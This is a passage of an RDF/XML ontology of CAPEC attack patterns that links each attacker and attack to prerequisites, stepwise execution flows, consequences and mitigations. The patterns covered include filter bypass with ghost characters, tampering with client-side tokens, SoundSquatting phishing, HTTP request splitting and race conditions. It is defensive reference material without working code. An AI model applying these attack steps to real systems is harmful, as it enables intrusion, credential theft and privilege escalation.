          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine if the source code is available and if so  examine the filter logic.::STEP:2:PHASE:Experiment:DESCRIPTION:If the source code is not available  write a small program that loops through various possible inputs to given API call and tries a variety of alternate (but equivalent) encodings of strings with leading ghost characters. Knowledge of frameworks and libraries used and what filters they apply will help to make this search more structured.::STEP:3:PHASE:Experiment:DESCRIPTION:Observe the effects. See if the probes are getting past the filters. Identify a string that is semantically equivalent to that which an adversary wants to pass to the targeted API  but syntactically structured in a way as to get past the input filter. That encoding will contain certain ghost characters that will help it get past the filters. These ghost characters will be ignored by the targeted API.::STEP:4:PHASE:Exploit:DESCRIPTION:Once the winning alternate encoding using (typically leading) ghost characters is identified  an adversary can launch the attacks against the targeted API (e.g. directory traversal attack  arbitrary shell command execution  corruption of files)::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::173::41::172::171::179::180::181::183::184::20::74::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted API must ignore the leading ghost characters that are used to get past the filters for the semantics to be the same.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The ability to make an API request  and knowledge of ghost characters that will not be filtered by any input validation. These ghost characters must be known to not affect the way in which the request will be interpreted.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack133">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#562">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:17::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Modify Shared File"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker190">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#329"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack190"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3  Port Unreachable..::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::One solution to this problem is to protect encrypted data with a CRC of some sort. If knowing who last manipulated the data is important  then using a cryptographic message authentication code (or hMAC) is prescribed. However  this guidance is not a panacea. In particular  any value created by (and therefore encrypted by) the client  which itself is a malicious value  all the protective cryptography in the world can&apos;t make the value &apos;correct&apos; again. Put simply  if the client has control over the whole process of generating and encoding the value  then simply protecting its integrity doesn&apos;t help.::Make sure to protect client side authentication tokens for confidentiality (encryption) and integrity (signed hash)::Make sure that all session tokens use a good source of randomness::Perform validation on the server side to make sure that client side data tokens are consistent with what is expected.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack385">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#39">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:22::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating Opaque Client-based Data Tokens"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::353::285::302::472::565::315::539::384::233::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Enumerate information passed to client side) The attacker identifies the parameters used as part of tokens to take business or security decisionsTECHNIQUE:Use WebScarab to reveal hidden fields while browsing.:TECHNIQUE:Use a sniffer to capture packets:TECHNIQUE:View source of web page to find hidden fields:TECHNIQUE:Examine URL to see if any opaque tokens are in it:TECHNIQUE:Disassemble or decompile client-side application:TECHNIQUE:Use debugging tools such as File Monitor  Registry Monitor  Debuggers  etc.::STEP:2:PHASE:Explore:DESCRIPTION:(Determine protection mechanism for opaque token) The attacker determines the protection mechanism used to protect the confidentiality and integrity of these data tokens. They may be obfuscated or a full blown encryption may be used.TECHNIQUE:Look for signs of well-known character encodings:TECHNIQUE:Look for cryptographic signatures:TECHNIQUE:Look for delimiters or other indicators of structure::STEP:3:PHASE:Experiment:DESCRIPTION:(Modify parameter/token values) Trying each parameter in turn  the attacker modifies the valuesTECHNIQUE:Modify tokens logically:TECHNIQUE:Modify tokens arithmetically:TECHNIQUE:Modify tokens bitwise:TECHNIQUE:Modify structural components of tokens:TECHNIQUE:Modify order of parameters/tokens::STEP:4:PHASE:Experiment:DESCRIPTION:(Cycle through values for each parameter.) Depending on the nature of the application  the attacker now cycles through values of each parameter and observes the effects of this modification in the data returned by the serverTECHNIQUE:Use network-level packet injection tools such as netcat:TECHNIQUE:Use application-level data modification tools such as Tamper Data  WebScarab  TamperIE  etc.:TECHNIQUE:Use modified client (modified by reverse engineering):TECHNIQUE:Use debugging tools to modify data in client::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Monitor network activity to detect any anomalous or unauthorized communication exchanges.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack47">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#154">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Resource Location Spoofing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker418">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#160"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack418"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::346::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must include the use of APIs that execute scripts.::The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use proven cryptographic algorithms with recommended key sizes.::Ensure that the algorithms are used properly. That means: 1. Not rolling out your own crypto; Use proven algorithms and implementations. 2. Choosing initialization vectors with sufficiently random numbers 3. Generating key material using good sources of randomness and avoiding known weak keys 4. Using proven protocols and their implementations. 5. Picking the most appropriate cryptographic algorithm for your usage context and data::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack372">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#97">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:192::NATURE:CanPrecede:CAPEC ID:20::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cryptanalysis"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::327::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:An attacker discovers a weakness in the cryptographic algorithm or a weakness in how it was applied to a particular chunk of plaintext.::STEP:2:PHASE:Exploit:DESCRIPTION:An attacker leverages the discovered weakness to decrypt  partially decrypt or infer some information about the contents of the encrypted message. All of that is done without knowing the secret key.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data In most cases  if cryptanalysis is successful at all  an adversary will not be able to decrypt the entire message  but instead will only be able to deduce some information about the plaintext. However  that may be sufficient for an adversary  depending on the context of the attack.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Authenticate all servers and perform redundant checks when using DNS hostnames.::Purchase potential SoundSquatted domains and forward to legitimate domain.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack158">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#631">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:616::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanFollow:CAPEC ID:98::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#SoundSquatting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine target website) The adversary first determines which website to impersonate  generally one that is trusted  receives a consistent amount of traffic  and is a homophone.TECHNIQUE:Research popular or high traffic websites which are also homophones.::STEP:2:PHASE:Experiment:DESCRIPTION:(Impersonate trusted domain) In order to impersonate the trusted domain  the adversary needs to register the SoundSquatted URL.TECHNIQUE:Register the SoundSquatted domain.::STEP:3:PHASE:Exploit:DESCRIPTION:(Deceive user into visiting domain) Finally  the adversary needs to deceive a user into visiting the SoundSquatted domain.TECHNIQUE:Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.:TECHNIQUE:Assume that a user will unintentionally use the homophone in the URL  leading the user to the SoundSquatted domain.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:OtherTECHNICAL IMPACT:Other:NOTE:Other Other Depending on the intention of the adversary  a successful SoundSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker417">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#51">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:203::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Poison Web Service Registry"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack417">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#51"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::285::74::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::285::74::693::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The attacker must be able to write to resources or redirect access to the service registry.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Capability to directly or indirectly modify registry resources::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Implement Ingress filters to check the validity of received routes. However  this relies on the accuracy of Internet Routing Registries (IRRs) databases which are often not well-maintained. Implement Secure BGP (S-BGP protocol)  which improves authorization and authentication capabilities based on public-key cryptography.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack175"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker238">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#189"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack238"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Black box methods require (at minimum) the ability to interact with the functional boundaries where the software communicates with a larger processing environment  such as inter-process communication on a host operating system  or via networking protocols.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Make sure to install the latest vendor security patches available for the web server.::If possible  make use of SSL.::Install a web application firewall that has been secured against HTTP Request Splitting::Use web servers that employ a tight HTTP parsing process::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack379">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#105">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:34::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Request Splitting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::436::444::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Investigate Target Environment) Determine the technologies used in the target environment such as types of browsers  web servers  application firewalls  proxies  etc.TECHNIQUE:Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand how HTTP Request headers are parsed::STEP:2:PHASE:Exploit:DESCRIPTION:(Post a malicious HTTP Request) Post a malicious HTTP request that will be interpreted as multiple HTTP requests when parsed on the serverTECHNIQUE:Post a malicious HTTP Request utilizing double CR/LF characters in HTTP header to cause request splitting:TECHNIQUE:Post a malicious HTTP Request utilizing Transfer Encoding: chunked in the request header to cause request splitting:TECHNIQUE:Post a malicious HTTP Request utilizing double Content-Length headers to cause request splitting::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker105">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#480">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:115::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Escaping Virtualization"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack105">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#480"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::693::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::693::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use safe libraries to access resources such as files.::Be aware that improper use of access function calls such as chown()  tempfile()  chmod()  etc. can cause a race condition.::Use synchronization to control the flow of execution.::Use static analysis tools to find race conditions.::Pay attention to concurrency problems related to the access of resources.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack462">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#29">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:26::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::367::368::366::370::362::662::691::663::665::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access he has.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary confirms access to a resource on the target host. The adversary confirms ability to modify the targeted resource.::STEP:3:PHASE:Exploit:DESCRIPTION:The adversary decides to leverage the race condition by running the race  meaning that he would modify the resource between the first time the target program accesses the file and the time the target program uses the file. During that period of time  the adversary can replace the resource and cause an escalation of privilege.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Alter Execution Logic::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack432">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#26">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Leveraging Race Conditions"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::368::363::366::370::362::662::689::667::665::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The adversary explores to gauge what level of access he has.::STEP:2:PHASE:Experiment:DESCRIPTION:The adversary gains access to a resource on the target host. The adversary modifies the targeted resource. The resource&apos;s value is used to determine the next normal execution action.::STEP:3:PHASE:Exploit:DESCRIPTION:The resource is modified/checked concurrently by multiple processes. By using one of the processes  the adversary is able to modify the value just before it is consumed by a different process. A race condition occurs and is exploited by the adversary to abuse the target host.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Do not enable the feature of Hidden SSIDs (also known as Network Cloaking) – this option disables the usual broadcasting of the SSID by the access point  but forces the mobile handset to send requests on all supported radio channels which contains the SSID. The result is that tracking of the mobile device becomes easier since it is transmitting the SSID more frequently.::Frequently change the SSID to new and unrelated values::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack401"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::In a J2EE setting  administrators can associate a role that is impossible for the authenticator to grant users  such as NoAccess  with all Servlets to which access is guarded by a limited number of servlets visible to  and accessible by  the user. Having done so  any direct access to those protected Servlets will be prohibited by the web container. In a more general setting  the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack384">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#1">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:122::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Accessing Functionality Not Properly Constrained by ACLs"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::285::732::276::693::721::434::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Survey) The attacker surveys the target application  possibly as a valid and authenticated userTECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Brute force guessing of resource names:TECHNIQUE:Brute force guessing of user names / credentials:TECHNIQUE:Brute force guessing of function names / actions::STEP:2:PHASE:Explore:DESCRIPTION:(Identify Functionality) At each step  the attacker notes the resource or functionality access mechanism invoked upon performing specific actionsTECHNIQUE:Use the web inventory of all forms and inputs and apply attack data to those inputs.:TECHNIQUE:Use a packet sniffer to capture and record network traffic:TECHNIQUE:Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment  in order to find weaknesses that can be exploited in a production environment.::STEP:3:PHASE:Experiment:DESCRIPTION:(Iterate over access capabilities) Possibly as a valid user  the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.TECHNIQUE:Fuzzing of API parameters (URL parameters  OS API parameters  protocol parameters)::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker237">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#201">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:231::NATURE:ChildOf:CAPEC ID:278::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#XML Entity Linking"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack237">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#201"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
